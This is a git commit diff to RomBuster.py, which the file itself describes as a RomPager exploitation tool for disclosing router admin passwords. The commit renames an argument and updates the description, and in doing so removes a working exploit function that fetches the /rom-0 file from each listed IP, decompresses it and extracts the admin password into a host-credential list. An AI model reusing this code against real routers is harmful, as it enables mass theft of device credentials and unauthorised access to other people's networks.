6877804370a4ee6cab056ef9cbc2d825e38a87e0
Ivan Nikolsky <enty8080@gmail.com>
2021-05-18 22:38:59 +0300

    Update RomBuster.py

--- RomBuster.py
+++ RomBuster.py
@@ -2,26 +2,7 @@
 
 import argparse
 
-description = "."
+description = "RomBuster is a RomPager exploitation tool that allows to disclosure network router admin password."
 parser = argparse.ArgumentParser(description=description)
-parser.add_argument('--list', dest='list', help='IP addresses list.')
+parser.add_argument('--ip-list', dest='list', help='IP addresses list.')
 args = parser.parse_args()
-
-iots = list()
-
-def exploit(host, thread):
-    try:
-        response = requests.get(f"http://{host}/rom-0", verify=False, timeout=1)
-    except Exception:
-        return # connection rejected
-
-    if response.status_code != 200:
-        return # not vulnerable
-
-    data = response.content[8568:]
-    result, window = LZSDecompress(data, RingList(2048))
-
-    password = re.findall("([\040-\176]{5,})", result)
-
-    if password[0]:
-        iots.append(f"{host} - admin:{password}")
